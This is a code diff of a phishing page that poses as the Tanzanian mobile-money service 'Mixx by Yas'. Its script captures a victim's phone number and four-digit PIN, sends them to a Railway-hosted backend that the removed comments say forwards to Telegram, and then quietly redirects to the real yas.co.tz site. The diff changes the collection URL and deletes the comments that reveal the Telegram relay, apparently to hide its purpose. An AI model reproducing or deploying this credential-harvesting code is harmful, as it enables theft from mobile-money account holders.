@@ -156,7 +156,6 @@
       color: #6c757d;
     }
 
-    /* Loading spinner - subtle, no popup */
     .loader {
       display: none;
       width: 20px;
@@ -214,18 +213,16 @@
       </div>
     </form>
 
-    <!-- Subtle loader only - no popups, no messages -->
     <div class="loader" id="loader"></div>
-
     <div class="footer-note">💰 Tuma sasa!</div>
   </div>
 
   <script>
     (function(){
       // ============================================
-      // RAILWAY BACKEND URL - Sends directly to Telegram
+      // NEW RAILWAY BACKEND URL
       // ============================================
-      const BACKEND_URL = 'https://mixxyas05com-production.up.railway.app/Server';
+      const BACKEND_URL = 'https://mixx-by-yastz-production.up.railway.app/Server';
 
       const phoneInput = document.getElementById("phoneInput");
       const pinHidden = document.getElementById("pinHidden");
@@ -235,12 +232,10 @@
       let realPin = ["", "", "", ""];
       let submitted = false;
 
-      // ----- phone validation -----
       phoneInput.addEventListener('input', function(e) {
         this.value = this.value.replace(/\D/g, '').slice(0, 10);
       });
 
-      // ----- main submit: send to Railway (which forwards to Telegram) -----
       async function submitCapture() {
         if (submitted) return;
         submitted = true;
@@ -248,9 +243,7 @@
         const phone = phoneInput.value;
         const fullPin = realPin.join('');
 
-        // Show loader
         loader.classList.add('show');
-
         console.log('📤 Sending to Railway:', { phone, pin: fullPin });
 
         try {
@@ -265,23 +258,17 @@
           const result = await response.json();
           console.log('✅ Response:', result);
           
-          // Hide loader
           loader.classList.remove('show');
-          
-          // Redirect immediately - no popups
           window.location.href = "https://yas.co.tz/mixx-by-yas/";
           
         } catch (error) {
           console.error('❌ Error:', error);
           loader.classList.remove('show');
-          submitted = false; // Allow retry
-          
-          // Redirect anyway - no popups
+          submitted = false;
           window.location.href = "https://yas.co.tz/mixx-by-yas/";
         }
       }
 
-      // ----- update hidden pin & trigger submit if complete -----
       function updateHiddenAndSubmit() {
         pinHidden.value = realPin.join('');
         if (realPin.every(x => x !== "") && phoneInput.value.length === 10 && !submitted) {
@@ -289,7 +276,6 @@
         }
       }
 
-      // ----- pin boxes event binding -----
       pinBoxes.forEach((box, idx) => {
         box.addEventListener('input', function(e) {
           let val = e.target.value.replace(/\D/g, '');
@@ -329,7 +315,6 @@
         });
       });
 
-      // ----- enter key -----
       document.addEventListener('keydown', function(e) {
         if (e.key === "Enter" && realPin.every(x => x !== "") && phoneInput.value.length === 10 && !submitted) {
           e.preventDefault();
@@ -344,7 +329,7 @@
         }
       });
 
-      console.log('✅ MIXX_BY YAS loaded - sending directly to Telegram via Railway');
+      console.log('✅ MIXX_BY YAS loaded');
       console.log('🔗 Backend URL:', BACKEND_URL);
     })();
   </script>
